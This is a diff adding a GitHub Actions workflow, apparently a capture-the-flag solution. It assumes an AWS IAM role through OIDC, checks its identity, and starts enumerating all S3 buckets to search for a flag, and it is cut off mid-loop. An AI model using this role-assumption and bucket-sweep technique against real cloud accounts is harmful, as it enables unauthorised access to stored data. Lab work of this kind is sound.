@@ -1,0 +1,27 @@
+name: Find Flag
+on:
+  push:
+    branches: [corgi]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  find:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          role-session-name: gha-${{ github.run_id }}
+          aws-region: eu-central-1
+
+      - name: Who am I
+        run: aws sts get-caller-identity
+
+      - name: Search all buckets for "flag"
+        run: |
+          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
+            echo "=== $b ==="
